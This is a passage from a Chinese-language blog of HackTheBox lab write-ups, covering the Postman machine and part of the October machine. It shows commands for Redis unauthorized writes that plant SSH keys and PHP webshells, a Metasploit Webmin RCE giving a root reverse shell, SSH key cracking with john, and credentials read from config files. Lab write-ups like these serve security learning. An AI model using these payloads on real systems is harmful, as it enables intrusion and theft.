<li><a href="https://github.com/knownsec/rtcp" target="_blank" rel="noopener">https://github.com/knownsec/rtcp</a></li>
<li><a href="https://0x00sec.org/t/htb-solidstate-write-up/5129" target="_blank" rel="noopener">https://0x00sec.org/t/htb-solidstate-write-up/5129</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/30/yuque/HackTheBox%EF%BC%9APostman%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/30/yuque/HackTheBox%EF%BC%9APostman%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Postman笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-30T23:39:20+08:00">
                2020-04-30
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>10.10.10.160<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588261192914-37ae040d-5300-4835-bfcd-a6f9af841a35.png#align=left&display=inline&height=246&margin=%5Bobject%20Object%5D&name=image.png&originHeight=491&originWidth=773&size=127013&status=done&style=none&width=387" alt="image.png"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap 10.10.10.160 -p22,80,6379,10000 -sV -sC -oA scans/allport.nmap --min-rate 1000</span></span><br><span class="line">Nmap scan report for postman (10.10.10.160)</span><br><span class="line">Host is up (0.72s latency).</span><br><span class="line">rDNS record for 10.10.10.160: Postman</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: The Cyber Geek's Personal Website</span><br><span class="line">6379/tcp  open  redis   Redis key-value store 4.0.9</span><br><span class="line">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span><br><span class="line">|_http-server-header: MiniServ/1.910</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>亚洲这边到 HTB 欧洲服务器的延时真的高，不指定<code>--min-rate</code>扫全端口要半个多小时，指定了又要丢包，老是扫不到全端口，服气哦<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588297200245-2cce5623-e166-4a01-972b-f19094dd1d85.png#align=left&display=inline&height=152&margin=%5Bobject%20Object%5D&name=image.png&originHeight=303&originWidth=984&size=53776&status=done&style=none&width=492" alt="image.png"></p>
<h2 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/HTB/postman<span class="comment"># nikto -h https://postman:10000/ -output scans/nikto.txt</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">+ Target IP:          10.10.10.160</span><br><span class="line">+ Target Hostname:    postman</span><br><span class="line">+ Target Port:        10000</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ SSL Info:        Subject:  /O=Webmin Webserver on Postman/CN=*/emailAddress=root@Postman</span><br><span class="line">                   Ciphers:  TLS_AES_256_GCM_SHA384</span><br><span class="line">                   Issuer:   /O=Webmin Webserver on Postman/CN=*/emailAddress=root@Postman</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Server: MiniServ/1.910</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>确定版本<code>1.910</code></p>
<h2 id="10000-端口：webmin"><a href="#10000-端口：webmin" class="headerlink" title="10000 端口：webmin"></a>10000 端口：webmin</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588261564115-75d7bb3f-7115-441d-8530-2d8699461393.png#align=left&display=inline&height=444&margin=%5Bobject%20Object%5D&name=image.png&originHeight=887&originWidth=1709&size=74919&status=done&style=none&width=854.5" alt="image.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/HTB/postman<span class="comment"># searchsploit webmin</span></span><br><span class="line">Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)               | exploits/linux/remote/46984.rb</span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; show info</span><br><span class="line"></span><br><span class="line">       Name: Webmin Package Updates Remote Command Execution</span><br><span class="line">     Module: exploit/linux/http/webmin_packageup_rce</span><br><span class="line">   Platform: Unix</span><br><span class="line">       Arch: cmd</span><br><span class="line"> Privileged: Yes</span><br><span class="line">    License: Metasploit Framework License (BSD)</span><br><span class="line">       Rank: Excellent</span><br><span class="line">  Disclosed: 2019-05-16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Available targets:</span><br><span class="line">  Id  Name</span><br><span class="line">  <span class="comment">--  ----</span></span><br><span class="line">  0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line"><span class="keyword">Check</span> supported:</span><br><span class="line">  Yes</span><br><span class="line"></span><br><span class="line">Basic options:</span><br><span class="line">  <span class="keyword">Name</span>       <span class="keyword">Current</span> Setting  <span class="keyword">Required</span>  Description</span><br><span class="line">  <span class="comment">----       ---------------  --------  -----------</span></span><br><span class="line">  <span class="keyword">PASSWORD</span>                    yes       Webmin <span class="keyword">Password</span></span><br><span class="line">  Proxies                     <span class="keyword">no</span>        A proxy <span class="keyword">chain</span> <span class="keyword">of</span> <span class="keyword">format</span> <span class="keyword">type</span>:host:port[,<span class="keyword">type</span>:host:port][...]</span><br><span class="line">  RHOSTS                      yes       The target host(s), <span class="keyword">range</span> CIDR identifier, <span class="keyword">or</span> <span class="keyword">hosts</span> <span class="keyword">file</span> <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">  RPORT      <span class="number">10000</span>            yes       The target port (TCP)</span><br><span class="line">  SSL        <span class="literal">false</span>            <span class="keyword">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">  TARGETURI  /                yes       Base <span class="keyword">path</span> <span class="keyword">for</span> Webmin application</span><br><span class="line">  USERNAME                    yes       Webmin Username</span><br><span class="line">  VHOST                       <span class="keyword">no</span>        <span class="keyword">HTTP</span> <span class="keyword">server</span> <span class="keyword">virtual</span> host</span><br><span class="line"></span><br><span class="line">Payload information:</span><br><span class="line">  <span class="keyword">Space</span>: <span class="number">512</span></span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  This <span class="keyword">module</span> exploits an arbitrary command execution vulnerability <span class="keyword">in</span></span><br><span class="line">  Webmin <span class="number">1.910</span> <span class="keyword">and</span> <span class="keyword">lower</span> versions. <span class="keyword">Any</span> <span class="keyword">user</span> authorized <span class="keyword">to</span> the <span class="string">"Package</span></span><br><span class="line"><span class="string">  Updates"</span> <span class="keyword">module</span> can <span class="keyword">execute</span> arbitrary commands <span class="keyword">with</span> root privileges.</span><br><span class="line"></span><br><span class="line"><span class="keyword">References</span>:</span><br><span class="line">  https://cvedetails.com/cve/CVE<span class="number">-2019</span><span class="number">-12840</span>/</span><br><span class="line">  https://www.pentest.com.tr/exploits/Webmin<span class="number">-1910</span>-<span class="keyword">Package</span>-Updates-Remote-Command-Execution.html</span><br></pre></td></tr></table></figure>

<p>有一个需要登录的 rce，还附带提权到<code>root</code>的效果，那么，找密码吧</p>
<h2 id="Redis-gt-ssh"><a href="#Redis-gt-ssh" class="headerlink" title="Redis -&gt; ssh"></a>Redis -&gt; ssh</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先生成密钥</span></span><br><span class="line">sshkeygen -t rsa</span><br><span class="line">(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; key.txt</span><br><span class="line">cat /root/.ssh/key.txt | ./redis-cli -h 10.10.10.160 -x <span class="keyword">set</span> xxx</span><br><span class="line">./redis-cli -h <span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span></span><br><span class="line">CONFIG <span class="keyword">SET</span> dir /<span class="keyword">var</span>/lib/redis/.ssh/</span><br><span class="line">CONFIG <span class="keyword">SET</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line"><span class="keyword">save</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh 连接</span></span><br><span class="line">ssh -i id_rsa redis@<span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span></span><br></pre></td></tr></table></figure>

<p>这里需要注意的是，设定的目录是<code>redis</code>家目录下<code>.ssh</code>目录，之前就是因为目录设错了，导致没法连接到<code>redis</code><br>进到 redis 后，发现<code>id_rsa.bak</code>，应该是<code>matt的</code>私钥，老方法，用 john 爆破出密码，接着 su 登录上去</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 格式转换</span></span><br><span class="line">python /usr/share/john/ssh2john.py  matt.pub &gt; matt2john-pass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解密码</span></span><br><span class="line">john matt2john-pass <span class="comment">--wordlist=/usr/share/wordlists/rockyou.txt</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 2 for all loaded hashes</span><br><span class="line">Will run 8 OpenMP threads</span><br><span class="line">Note: This format may emit false positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line"></span><br><span class="line">computer2008     (matt.pub)</span><br></pre></td></tr></table></figure>

<p>在 redis 用户里，su 切换进 Matt 用户</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>刚刚在<code>webmin</code>那里提到，有个提权漏洞，那么我们填好帐号密码，使用 msf 一顿操作，搞定</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; set USERNAME Matt</span><br><span class="line">USERNAME =&gt; Matt</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; set password computer2008</span><br><span class="line">password =&gt; computer2008</span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">[+] Session cookie: abc6894b84eb41438c578755bb938523</span><br><span class="line">[*] Attempting to execute the payload...</span><br><span class="line">[*] Command shell session 1 opened (10.10.16.122:4444 -&gt; 10.10.10.160:32932) at 2020-05-01 10:44:52 +0000</span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="用-john-爆破-ssh-密钥"><a href="#用-john-爆破-ssh-密钥" class="headerlink" title="用 john 爆破 ssh 密钥"></a>用 john 爆破 ssh 密钥</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py  matt.pub &gt; id_rsa.hash</span><br><span class="line">john id_rsa.hash -wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>

<h2 id="redis-gt-ssh"><a href="#redis-gt-ssh" class="headerlink" title="redis -&gt; ssh"></a>redis -&gt; ssh</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sshkeygen -t rsa</span><br><span class="line">...</span><br><span class="line">(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; key.txt</span><br><span class="line">cat /root/.ssh/key.txt | ./redis-cli -h 10.10.10.160 -x <span class="keyword">set</span> xxx</span><br><span class="line">./redis-cli -h <span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span></span><br><span class="line">CONFIG <span class="keyword">SET</span> dir /<span class="keyword">var</span>/lib/redis/.ssh/</span><br><span class="line">CONFIG <span class="keyword">SET</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line"><span class="keyword">save</span></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"><span class="comment"># ssh 连接</span></span><br><span class="line">ssh -i id_rsa redis@<span class="number">10.10</span><span class="number">.10</span><span class="number">.160</span></span><br></pre></td></tr></table></figure>

<p>此时 ssh 的登录密码，就是你当初<code>sshkeygen -t rsa</code>后输入的密码。</p>
<h2 id="redis-gt-webshell"><a href="#redis-gt-webshell" class="headerlink" title="redis -&gt; webshell"></a>redis -&gt; webshell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">config <span class="keyword">set</span> dir /<span class="keyword">var</span>/www/html/</span><br><span class="line">	<span class="comment">#  /home/wwwroot/default/</span></span><br><span class="line"></span><br><span class="line">config <span class="keyword">set</span> dbfilename redis.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> webshell <span class="string">"&lt;?php phpinfo(); ?&gt;"</span></span><br><span class="line">	<span class="comment"># "&lt;?php eval($_POST['cmd']);?&gt;"</span></span><br><span class="line">  <span class="comment"># "&lt;?php system($_GET['cmd']);?&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">save</span></span><br></pre></td></tr></table></figure>

<h1 id="references"><a href="#references" class="headerlink" title="references"></a>references</h1><ul>
<li><a href="https://xavilok.es/postman/" target="_blank" rel="noopener">https://xavilok.es/postman/</a></li>
<li><a href="https://blog.csdn.net/test1988x/article/details/103921210" target="_blank" rel="noopener">https://blog.csdn.net/test1988x/article/details/103921210</a></li>
<li><a href="https://hackso.me/postman-htb-walkthrough/" target="_blank" rel="noopener">https://hackso.me/postman-htb-walkthrough/</a></li>
<li><a href="https://sheerazali.com/postman-writeup-walkthrough-hack-the-box/" target="_blank" rel="noopener">https://sheerazali.com/postman-writeup-walkthrough-hack-the-box/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/04/24/yuque/HackTheBox%EF%BC%9AOctober%E7%AC%94%E8%AE%B0(PWN)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Unc1e">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Unc1e的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/24/yuque/HackTheBox%EF%BC%9AOctober%E7%AC%94%E8%AE%B0(PWN)/" itemprop="url">HackTheBox：October笔记(PWN)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-24T23:29:56+08:00">
                2020-04-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/HTB/october<span class="comment"># nmap  -p22,80 -sV -sC 10.10.10.16 --min-rate 1000</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-24 14:48 UTC</span><br><span class="line">Nmap scan report for 10.10.10.16</span><br><span class="line">Host is up (0.54s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)</span><br><span class="line">|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)</span><br><span class="line">|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)</span><br><span class="line">|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: PUT PATCH <span class="keyword">DELETE</span></span><br><span class="line">|_http-<span class="keyword">server</span>-header: Apache/<span class="number">2.4</span><span class="number">.7</span> (Ubuntu)</span><br><span class="line">|_http-title: October CMS - Vanilla</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">+ Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.21</span><br></pre></td></tr></table></figure>

<h2 id="80-端口：弱密码"><a href="#80-端口：弱密码" class="headerlink" title="80 端口：弱密码"></a>80 端口：弱密码</h2><p>一款叫<code>october</code>的<code>cms</code>，用 searchsploit 搜索，有一些漏洞，但有效利用还需要确定版本号，去 github 上看源代码中版本号的位置，存在网页根目录下的<code>composer.json</code>文件中，测试外部无法直接访问，<code>changelog</code>和<code>readme</code>里也无版本信息，作罢。后来拿下了 www-data 权限后，看到是版本<code>1.0.412</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~/HTB/october<span class="comment"># searchsploit october</span></span><br><span class="line"><span class="comment">--------------------------------------- ----------------------------------------</span></span><br><span class="line"> Exploit Title                         |  Path</span><br><span class="line">                                       | (/usr/share/exploitdb/)</span><br><span class="line"><span class="comment">--------------------------------------- ----------------------------------------</span></span><br><span class="line">October CMS - Upload Protection Bypass | exploits/php/remote/47376.rb</span><br><span class="line">October CMS 1.0.412 - Multiple Vulnera | exploits/php/webapps/41936.txt</span><br><span class="line">October CMS &lt; 1.0.431 - Cross-Site Scr | exploits/php/webapps/44144.txt</span><br><span class="line">October CMS User Plugin 1.4.5 - Persis | exploits/php/webapps/44546.txt</span><br><span class="line">OctoberCMS 1.0.425 (Build 425) - Cross | exploits/php/webapps/42978.txt</span><br><span class="line">OctoberCMS 1.0.426 (Build 426) - Cross | exploits/php/webapps/43106.txt</span><br><span class="line"><span class="comment">--------------------------------------- ----------------------------------------</span></span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587743015752-e4b4f0fe-f977-4453-8853-4611207cb152.png#align=left&display=inline&height=491&margin=%5Bobject%20Object%5D&name=image.png&originHeight=981&originWidth=1919&size=491537&status=done&style=none&width=959.5" alt="image.png"><br><code>cookie</code>感觉有东西，但是解开来发现并不是 jwt，作罢<br>扫描下目录</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irbuster -u http://10.10.10.16 -t 20 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -v</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588001877173-57637cb7-7229-4831-a67e-984a3a14d6b1.png#align=left&display=inline&height=114&margin=%5Bobject%20Object%5D&name=image.png&originHeight=227&originWidth=1775&size=19044&status=done&style=none&width=887.5" alt="image.png"><br>上面图片并不完整（扫描是真的慢），总之找到后台路径<code>/backend/backend/auth/signin</code>，会回显账号是否存在，得到帐号<code>admin</code>，burp 跑字典结果直接给我 ban 了。。。。。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588002377571-dd4e5414-4d71-48da-92ea-08df5866464d.png#align=left&display=inline&height=372&margin=%5Bobject%20Object%5D&name=image.png&originHeight=743&originWidth=1899&size=159511&status=done&style=none&width=949.5" alt="image.png"></p>
<p>注册了个用户，没找到越权或者上传点。<br>最后看别人的<code>walkthrough</code>，弱口令<code>admin</code>直接进后台了，给爷整吐了。。。。（已经是第二次被这个 admin 拦在外面了，果然是经验不丰富啊！！)<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588002977053-b4a72fb6-484b-4948-be6f-f61ac35ab9ee.png#align=left&display=inline&height=393&margin=%5Bobject%20Object%5D&name=image.png&originHeight=786&originWidth=1570&size=158369&status=done&style=none&width=785" alt="image.png"><br>后面到 user 几乎就乏善可陈了，简单写下</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux october 4.4.0-78-generic <span class="comment">#99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 athlon i686 GNU/Linux</span></span><br><span class="line"></span><br><span class="line">Ubuntu 14.04.5 LTS</span><br></pre></td></tr></table></figure>

<p>一般提权就几种思路：配置错误（包括 sudo 误配，suid 滥用，高权限定时任务等）、密码通用和 exp 提权</p>
<h2 id="常用密码"><a href="#常用密码" class="headerlink" title="常用密码"></a>常用密码</h2><p>读配置文件，尝试登录<code>harry</code>失败</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/cms/config/database.php</span><br><span class="line"></span><br><span class="line">        'mysql' =&gt; [</span><br><span class="line">            'driver'    =&gt; 'mysql',</span><br><span class="line">            'host'      =&gt; 'localhost',</span><br><span class="line">            'port'      =&gt; '',</span><br><span class="line">            'database'  =&gt; 'october',</span><br><span class="line">            'username'  =&gt; 'october',</span><br><span class="line">            'password'  =&gt; 'OctoberCMSPassword!!',</span><br><span class="line">            'charset'   =&gt; 'utf8',</span><br><span class="line">            'collation' =&gt; 'utf8_unicode_ci',</span><br><span class="line">            'prefix'    =&gt; '',</span><br><span class="line">        ],</span><br></pre></td></tr></table></figure>

<p>读数据库账号密码</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1588003425220-ffb8cf02-d6ed-4aa7-af68-f5661a21b29c.png#align=left&display=inline&height=297&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=1342&size=129776&status=done&style=none&width=671" alt="image.png"></p>
<h2 id="msf-一把梭"><a href="#msf-一把梭" class="headerlink" title="msf 一把梭"></a>msf 一把梭</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">use</span> post/multi/recon/local_exploit_suggester</span><br><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span 